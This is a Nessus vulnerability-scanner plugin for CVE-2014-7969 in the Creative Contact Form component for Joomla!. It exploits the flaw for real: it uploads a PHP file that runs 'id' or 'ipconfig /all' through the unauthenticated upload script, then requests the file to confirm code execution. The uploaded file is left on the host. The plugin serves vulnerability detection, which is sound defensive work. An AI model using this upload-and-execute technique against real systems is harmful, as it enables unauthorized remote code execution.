#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(79420);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2014-7969");
  script_bugtraq_id(70723);
  script_osvdb_id(113673);
  script_xref(name:"EDB-ID", value:"35057");

  script_name(english:"Creative Contact Form Component for Joomla! File Upload RCE");
  script_summary(english:"Attempts to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The Creative Contact Form component for Joomla! (previously known as
Sexy Contact Form) running on the remote host is affected by a remote
code execution vulnerability within the
com_creativecontactform/fileupload/index.php script due to improper
sanitization or verification of uploaded files before placing them in
a user-accessible path. An unauthenticated, remote attacker can
exploit this issue, by uploading and then making a direct request to a
crafted file, to execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user ID.");
  script_set_attribute(attribute:"see_also", value:"http://creative-solutions.net/joomla/creative-contact-form");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Joomla! version 2.0.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/10/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/10/27");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/11/24");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2017 Tenable Network Security, Inc.");

  script_dependencies("os_fingerprint.nasl", "joomla_detect.nasl");
  script_require_keys("installed_sw/Joomla!", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "Creative Contact Form";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  regexes = make_list();
  regexes[0] = make_list('creativecontactform');
  checks["/components/com_creativecontactform/assets/js/creativecontactform.js"] = regexes;

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " component");

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig%20/all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig%20/all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig%20/all'] =  'Windows IP Configuration|Subnet Mask|IP(v(4|6)?)? Address';

token = (SCRIPT_NAME - ".nasl") + "-" + unixtime();
ext = ".php";
vuln = FALSE;
r = 0;

boundary = '-------------------------------';

foreach cmd (cmds)
{
  token += r;
  if (cmd == "id")
    attack = "<?php system('id');echo('path='); system('pwd');?>";
  else
  {
    attack = '<?php echo(' + "'<pre>');system('ipconfig /all');system('dir " +
    token + ext + "');?>";
  }

  postdata =
    boundary + '--\r\n' +
    'Content-Disposition: form-data; name="files[]"; filename="' + token + ext +
    '"\r\n' +
    'Content-Type: text/plain\r\n' +
    '\r\n' + attack + '\r\n\r\n' +
    boundary + '----\r\n';

  # Attempt exploit
  res = http_send_recv3(
    method       : "POST",
    item         : dir + "/components/com_creativecontactform/fileupload/index.php",
    port         : port,
    data         : postdata,
    add_headers  : make_array("Content-Type", "multipart/form-data; boundary=" +
                   boundary),
    exit_on_fail : TRUE
  );

  attack_req = http_last_sent_request();

  # Try accessing the file we uploaded
  file_path = "/components/com_creativecontactform/fileupload/files/" +
    token + ext;

  res2 = http_send_recv3(
    method       : "GET",
    item         : dir + file_path,
    port         : port,
    exit_on_fail : TRUE
  );
  output = res2[2];

  if (egrep(pattern:cmd_pats[cmd], string:output))
  {
    vuln = TRUE;
    if (cmd == "id")
    {
      line_limit = 2;
      item = eregmatch(pattern:"path=(.*)", string:output);

      if (!empty_or_null(item))
      {
        path = chomp(item[1]) + '/' + token + ext;
        pos = stridx(output, "path=");
        output = substr(output, 0, pos-1);
      }
      else path = 'unknown';
    }
    else
    {
      cmd = 'ipconfig /all'; #Format for report output
      line_limit = 10;
      output = strstr(output, "Windows IP");
      item = eregmatch(pattern:"Directory of (.*)", string:output);

      if (!empty_or_null(item))
      {
        path = chomp(item[1]) + '\\' + token + ext;
        pos = stridx(output, "Volume in drive");
        output = substr(output, 0, pos - 1);
      }
      else path = 'unknown';
    }
    if (empty_or_null(output)) output = res2[2]; # Just in case
    break;
  }
  # Increment file name before next request attempt
  else r++;
}
if (!vuln) audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " component");

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  cmd         : cmd,
  line_limit  : line_limit,
  request     : make_list(attack_req, install_url + file_path),
  output      : chomp(output),
  rep_extra   : '\n' + 'Note: This file has not been removed by Nessus and will need to be' +
                '\n' + 'manually deleted (' + path + ').'
);
